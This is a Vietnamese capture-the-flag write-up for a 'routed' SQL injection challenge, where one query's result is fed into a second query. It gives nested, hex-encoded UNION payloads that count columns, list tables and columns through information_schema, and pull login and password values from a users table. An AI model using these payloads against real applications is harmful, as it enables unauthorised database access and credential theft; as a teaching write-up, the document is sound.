# Challenge: SQL Injection - Routed

<img width="1529" height="506" alt="image" src="https://github.com/user-attachments/assets/c740efbb-7358-4b2d-9124-d770bfe001af" />

Vào bài thì cho một giao diện đăng nhập với 2 tab là Home và Search như vầy

<img width="493" height="138" alt="image" src="https://github.com/user-attachments/assets/24356d00-6779-4971-932d-011479f053f0" />

Mình thử nhập vào admin vào trong tab search thử , thì nó hiện ra thông tin của admin 

<img width="518" height="276" alt="image" src="https://github.com/user-attachments/assets/e56e121f-31fb-4518-a221-31bd7f0a43da" />

Dòng 1 chính là thứ mình vừa nhập 

Có thể backend nó đã dùng
```sql
SELECT request_login , found_id , email from users where search= 'admin'
```

Sau khi fuzz vài lần thì mình rút ra được các dấu `,` , `(` và chữ `order` ,... đều bị chặn . Vậy thì `union` , `select` ,  `'` , `-` đều không bị chặn . Nhưng vấn đề là khi mình thử 
```sql
admin'--
```
Thì nó lại báo lỗi syntax , không biết là do sao 

<img width="911" height="75" alt="image" src="https://github.com/user-attachments/assets/6e502e44-08c3-41b5-b967-829ba6631fc1" />

Sau khi đọc lại gơi í từ đề bài thì mình hiểu rằng ở đây nó không dùng 1 câu truy vấn để . Tức là nói nôm na thì kết quả của câu truy vấn thứ nhất , sẽ là tham số truyền vào câu truy vấn thứ 2

Tức là , backend có thể là 
```sql
SELECT request_login from public where search = 'admin'

Giả sử câu lệnh đầu tiên trả về admin luôn đi


Rồi câu truy vấn thứ 2 sẽ có form như sau:
SELECT found_id , email from user where request_login =  '$request_login'

Vì kết quả của câu đầu tiên là admin cho nên
SELECT found_id , email from user where request_login =  'admin'

Và nó sẽ trả về kết quả của found_id và email 
```
Cái bây giờ chúng ta cần là password , mà Câu truy vấn thứ 2 nó mới là cái trả về kết quả truy vấn ra màn hình , vậy bây giờ chúng ta cần làm sao để câu truy vấn thứ 2 nó sẽ có dạng thế này

```sql
SELECT found_id , email from users where request_login =  '' union select 1,password from users --
```
Dạng dạng như thế . Vậy thì ở câu truy vấn thứ nhất chúng ta sẽ làm sao mà kết quả truy vấn trả về

```sql
' union select 1,password from users --
```
cái này . vậy thì câu truy vấn phải là 
```sql
SELECT found_id , email from user where request_login =  '' union select 'union select 1,password from users -- -' -- -
```
Nhưng chúng ta phải hex nó ra để tránh việc dấu nháy làm sai cú pháp 

Rồi oke vào bài làm 

Đáng ra đầu tiên chúng ta phải xác định cột của truy vấn 1 nữa nhưng mà dấu phẩy lại bị chặn , không có cách nào để xác định , nhưng rất may là truy vấn đầu chỉ sử dụng một cột 

Sau đó xác định số cột trong câu truy vấn 2 , payload là:

```sql
' union select '' union select null,null -- -' -- -
```
hex nó ra
```sql
' union select 0x2720756e696f6e2073656c656374206e756c6c2c6e756c6c2d2d -- -
```
Kết quả là số cột bằng 2

<img width="1858" height="445" alt="image" src="https://github.com/user-attachments/assets/03ba88c1-7c50-4c1b-9cec-d5ed0077419a" />

Tiếp theo xác định bảng

```sql
' union select '' union select group_concat(table_name),1 from information_schema.tables where table_schema = database() -- -' -- -
```
hex nó ra
```sql
' union select 0x2720756e696f6e2073656c6563742067726f75705f636f6e636174287461626c655f6e616d65292c312066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d61203d2064617461626173652829202d2d202d -- -
```
Thu thập được bảng users

<img width="1870" height="478" alt="image" src="https://github.com/user-attachments/assets/5dde269b-9997-47fa-bf8f-cadc84266aac" />

Tiếp theo xác định cột 
```sql
' union select '' union select group_concat(column_name),1 from information_schema.columns where table_name = 'users' -- -' -- -
```
hex nó ra
```sql
' union select 0x2720756e696f6e2073656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292c312066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d65203d2027757365727327202d2d202d -- -
```
Kết quả là: cột email,id,login,password


Cuối cùng là 
```sql
' union select '' union select password,login from users -- -' -- -
```

Chúng ta done bài này nhe!!
